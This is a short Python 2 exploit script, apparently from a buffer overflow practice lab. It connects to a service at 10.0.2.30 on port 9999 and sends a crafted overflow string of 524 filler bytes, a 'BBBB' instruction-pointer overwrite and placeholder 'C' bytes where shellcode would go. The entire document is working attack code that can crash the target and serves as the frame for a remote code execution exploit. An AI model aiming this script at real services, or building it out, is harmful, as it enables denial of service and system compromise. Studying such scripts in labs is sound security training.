import sys
import socket

host = "10.0.2.30"
port = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    print "Connecting to " +str(host)
    s.connect((host, port))
    s.recv(1024)
    junk = b"A"*524
    EIP = b"BBBB"
    payload = b'C'*500
    print "Sending Payload..."
    s.sendall(junk+EIP+payload)
    print("Sent")

except Exception as e:
    print("Unable to connect " + str(host) + str(e))
    sys.exit(0)